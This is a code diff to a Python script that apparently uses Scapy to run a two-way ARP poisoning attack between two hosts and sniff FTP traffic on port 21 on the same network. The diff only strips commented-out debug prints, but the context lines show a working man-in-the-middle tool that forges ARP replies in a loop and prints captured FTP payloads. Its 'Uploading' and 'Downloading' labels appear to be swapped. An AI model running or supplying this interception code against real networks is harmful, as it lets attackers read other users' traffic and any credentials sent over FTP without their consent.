@@ -33,8 +33,7 @@ def is_valid_ip(ip_str):
 def arp_poison(ip_target, mac_target, ip_src):
     packet = ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src)
     send(packet, verbose=VERBOSE, count=3)  # send multiple ARP packets
-    # print(f"Sent ARP packet to {ip_target} from {ip_src}")
-
+    
 def restore_arp(ip_target, mac_target, ip_src, mac_src):
     packet = ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src, hwsrc=mac_src)
     send(packet, verbose=VERBOSE, count=3)
@@ -55,8 +54,6 @@ def packet_callback(packet):
             print(f"Downloading: FTP file transfer detected: {payload.decode(errors='ignore')}")
         if b"RETR" in payload:
             print(f"Uploading: FTP file transfer detected: {payload.decode(errors='ignore')}")
-    # else:
-    #     print("Non-FTP packet captured")
 
 if __name__ == "__main__":
     if len(sys.argv) < 5:
@@ -80,12 +77,9 @@ if __name__ == "__main__":
     
     try:
         while True: # to update cache 
-            # print("Starting ARP poison cycle...")
             arp_poison(args.ip_target, args.mac_target, args.ip_src)
             arp_poison(args.ip_src, args.mac_src, args.ip_target)
-            # print("Starting packet sniffing...")
             sniff(iface="eth0", filter="tcp port 21", prn=packet_callback, timeout=10)
-            # print("Sleeping for 2 seconds...")
             time.sleep(2)
     except Exception as e:
         print(f"Error: {e}")
